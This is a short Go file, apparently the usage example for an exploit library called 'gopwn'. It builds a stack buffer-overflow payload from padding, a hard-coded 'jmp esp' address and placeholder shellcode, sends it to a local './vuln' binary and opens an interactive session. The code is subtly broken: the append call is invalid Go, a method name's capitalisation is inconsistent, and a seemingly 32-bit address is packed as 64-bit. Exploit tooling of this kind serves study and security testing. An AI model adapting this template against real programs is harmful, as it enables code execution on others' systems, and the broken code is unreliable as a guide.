package gopwn


func Example(){
	offset := Pad("A", 16)
	payload := []byte{0x00,0x00,0x00,0x00,0x00}//shellcode
	jmp_esp := p64(0xf7423322)

	fPayload := append(offset, jmp_esp, payload...)

	p := Process("./vuln")
	p.Sendline(fPayload)
	p.interactive()
}